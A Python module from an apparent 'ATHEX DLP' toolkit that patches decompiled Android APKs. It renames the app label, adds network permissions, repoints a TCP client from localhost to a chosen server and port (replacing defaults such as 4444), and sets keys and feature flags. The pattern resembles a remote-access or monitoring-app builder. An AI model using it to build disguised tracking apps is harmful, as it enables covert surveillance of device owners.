"""
ATHEX DLP Enterprise - Config Injector
=======================================
Injects server configuration into APK source files.
"""

import os
import re
import json
import logging
import base64
from pathlib import Path
from typing import Dict, Optional

logger = logging.getLogger(__name__)


class ConfigInjector:
    """
    Injects server configuration into decompiled APK source.
    
    Modifies:
    - AndroidManifest.xml (app name, permissions)
    - smali files (server host, port)
    - res/values/strings.xml (app labels)
    - BuildConfig / constants
    """
    
    def __init__(self):
        """Initialize injector"""
        self.injection_count = 0
        logger.info("ConfigInjector initialized")
    
    def inject_all(self,
                   decompiled_dir: Path,
                   server_host: str,
                   server_port: int,
                   app_name: str,
                   encryption_key: str = "",
                   features: Dict = None):
        """
        Inject all configuration into decompiled APK.
        
        Args:
            decompiled_dir: Path to decompiled APK directory
            server_host: Target server hostname/IP
            server_port: Target server port
            app_name: Application display name
            encryption_key: Custom encryption key
            features: Feature flags to enable/disable
        """
        
        logger.info(f"Injecting config into: {decompiled_dir}")
        logger.info(f"  Host: {server_host}")
        logger.info(f"  Port: {server_port}")
        logger.info(f"  Name: {app_name}")
        
        self.injection_count = 0
        
        # 1. Inject into AndroidManifest.xml
        self.inject_manifest(decompiled_dir, app_name)
        
        # 2. Inject into smali files
        self.inject_smali_files(decompiled_dir, server_host, server_port)
        
        # 3. Inject into strings.xml
        self.inject_strings(decompiled_dir, app_name)
        
        # 4. Inject encryption key
        if encryption_key:
            self.inject_encryption_key(decompiled_dir, encryption_key)
        
        # 5. Inject feature flags
        if features:
            self.inject_features(decompiled_dir, features)
        
        logger.info(f"✅ Injection complete: {self.injection_count} files modified")
    
    def inject_manifest(self, decompiled_dir: Path, app_name: str):
        """Inject app name into AndroidManifest.xml"""
        manifest_path = decompiled_dir / "AndroidManifest.xml"
        
        if not manifest_path.exists():
            logger.warning(f"AndroidManifest.xml not found at {manifest_path}")
            return
        
        with open(manifest_path, 'r', encoding='utf-8') as f:
            content = f.read()
        
        original = content
        
        # Change app label
        content = re.sub(
            r'android:label="[^"]*"',
            f'android:label="{app_name}"',
            content
        )
        
        # Ensure required permissions exist
        required_permissions = [
            '<uses-permission android:name="android.permission.INTERNET" />',
            '<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />',
        ]
        
        for perm in required_permissions:
            if perm not in content:
                # Add before <application
                content = content.replace(
                    '<application',
                    f'    {perm}\n    <application'
                )
        
        if content != original:
            with open(manifest_path, 'w', encoding='utf-8') as f:
                f.write(content)
            
            self.injection_count += 1
            logger.debug(f"  ✓ Modified AndroidManifest.xml")
    
    def inject_smali_files(self, decompiled_dir: Path, server_host: str, server_port: int):
        """Inject server config into smali files"""
        smali_dirs = list(decompiled_dir.glob("smali*/com/athex/dlp"))
        
        if not smali_dirs:
            # Try other common paths
            smali_dirs = list(decompiled_dir.glob("smali*/**/TCPClient.smali"))
            if smali_dirs:
                smali_dirs = [smali_dirs[0].parent]
        
        for smali_dir in smali_dirs:
            self._inject_smali_directory(smali_dir, server_host, server_port)
    
    def _inject_smali_directory(self, smali_dir: Path, server_host: str, server_port: int):
        """Inject into all smali files in directory"""
        for smali_file in smali_dir.glob("*.smali"):
            self._inject_smali_file(smali_file, server_host, server_port)
    
    def _inject_smali_file(self, smali_file: Path, server_host: str, server_port: int):
        """Inject server config into a smali file"""
        with open(smali_file, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        
        original = content
        modified = False
        
        # Replace server host
        if '127.0.0.1' in content or '10.0.2.2' in content or 'localhost' in content:
            content = content.replace('127.0.0.1', server_host)
            content = content.replace('10.0.2.2', server_host)
            content = content.replace('localhost', server_host)
            modified = True
        
        # Replace default port hex values
        port_hex = hex(server_port)
        # Common default ports to replace: 22533 (0x5805), 9999 (0x270F), 4444 (0x115C)
        default_ports = ['0x5805', '0x270F', '0x115C', '0x2328']
        for default_port in default_ports:
            if default_port in content:
                content = content.replace(default_port, port_hex)
                modified = True
        
        if content != original:
            with open(smali_file, 'w', encoding='utf-8') as f:
                f.write(content)
            
            self.injection_count += 1
            logger.debug(f"  ✓ Modified {smali_file.name}")
    
    def inject_strings(self, decompiled_dir: Path, app_name: str):
        """Inject app name into strings.xml"""
        strings_paths = list(decompiled_dir.glob("res/values/strings.xml"))
        
        if not strings_paths:
            strings_paths = list(decompiled_dir.glob("res/values-*/strings.xml"))
        
        for strings_path in strings_paths:
            with open(strings_path, 'r', encoding='utf-8') as f:
                content = f.read()
            
            original = content
            
            # Change app_name string
            content = re.sub(
                r'<string name="app_name">[^<]*</string>',
                f'<string name="app_name">{app_name}</string>',
                content
            )
            
            if content != original:
                with open(strings_path, 'w', encoding='utf-8') as f:
                    f.write(content)
                
                self.injection_count += 1
                logger.debug(f"  ✓ Modified {strings_path.name}")
    
    def inject_encryption_key(self, decompiled_dir: Path, encryption_key: str):
        """Inject encryption key into source"""
        # Look for BuildConfig or Constants file
        for pattern in ["**/BuildConfig.smali", "**/Constants.smali", "**/Config.smali"]:
            for config_file in decompiled_dir.glob(pattern):
                with open(config_file, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                
                # Replace placeholder key
                if 'ENCRYPTION_KEY_PLACEHOLDER' in content:
                    content = content.replace('ENCRYPTION_KEY_PLACEHOLDER', encryption_key)
                    
                    with open(config_file, 'w', encoding='utf-8') as f:
                        f.write(content)
                    
                    self.injection_count += 1
                    logger.debug(f"  ✓ Injected encryption key into {config_file.name}")
                    return
    
    def inject_features(self, decompiled_dir: Path, features: Dict):
        """Inject feature flags"""
        for config_file in decompiled_dir.glob("**/BuildConfig.smali"):
            with open(config_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            for feature, enabled in features.items():
                feature_key = f"FEATURE_{feature.upper()}"
                if feature_key in content:
                    value = "0x1" if enabled else "0x0"
                    content = re.sub(
                        rf'{feature_key}\s*=\s*0x[01]',
                        f'{feature_key} = {value}',
                        content
                    )
            
            with open(config_file, 'w', encoding='utf-8') as f:
                f.write(content)
            
            self.injection_count += 1
            logger.debug(f"  ✓ Injected feature flags")
            break
    
    def get_injection_count(self) -> int:
        """Get number of files modified"""
        return self.injection_count


# ============================================================
# TEST
# ============================================================
if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    
    injector = ConfigInjector()
    
    print("\n📝 ConfigInjector ready")
    print(f"  Files modified: {injector.get_injection_count()}")